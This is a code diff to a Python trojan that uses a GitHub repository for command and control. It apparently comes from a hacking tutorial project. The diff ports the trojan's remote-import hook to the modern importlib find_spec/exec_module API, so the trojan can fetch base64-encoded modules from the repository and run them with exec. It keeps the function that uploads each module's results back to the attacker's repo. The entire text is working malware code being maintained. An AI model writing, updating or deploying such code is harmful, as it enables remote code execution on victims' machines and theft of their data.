@@ -2,7 +2,7 @@ import json
 import base64
 import sys
 import time 
-import importlib
+import importlib.util
 import random
 import threading
 import queue
@@ -50,36 +50,35 @@ def get_trojan_config():
         return []
 
     configured = True
-    for task in config:
-        if task['module'] not in sys.modules:
-            exec(f"import {task['module']}")
-        
     return config
 def store_module_result(data):
     gh,repo,branch=connect_to_github()
     remote_path=f"data/{trojan_id}/{random.randint(1000,10000)}.data"
     repo.create_file(remote_path,"Commit message",base64.b64encode(data).decode())
-
-class GitImporter(object):
+class GitImporter:
     def __init__(self):
-        self.current_module_code=""
-    def find_module(self,fullname,path=None):
-        if configured:
-            print("Attempting to retrieve %s" % fullname)
-            new_library=get_file_contents("modules/%s"%fullname)
+        self.source = None
 
-            if new_library is not None:
-                self.current_module_code=base64.b64decode(new_library)
-                return self
+    def find_spec(self, fullname, path, target=None):
+        print(f"[+] Checking remote module: {fullname}")
+
+        new_library = get_file_contents(f"modules/{fullname}")
+        if new_library:
+            self.source = base64.b64decode(new_library).decode()
+
+            return importlib.util.spec_from_loader(fullname, self)
+
         return None
-    def load_module(self,name):
-        module=importlib.new_module(name)
-        exec (self.current_module_code ) in module.__dict__
-        sys.modules[name]=module
-        return module
+
+    def create_module(self, spec):
+        return None  
+
+    def exec_module(self, module):
+        exec(self.source, module.__dict__)
 def module_runner(module):
     task_queue.put(1)
-    result=sys.modules[module].run()
+    mod = importlib.import_module(module)
+    result = mod.run()
     task_queue.get()
     store_module_result(result)
 if __name__=="__main__":
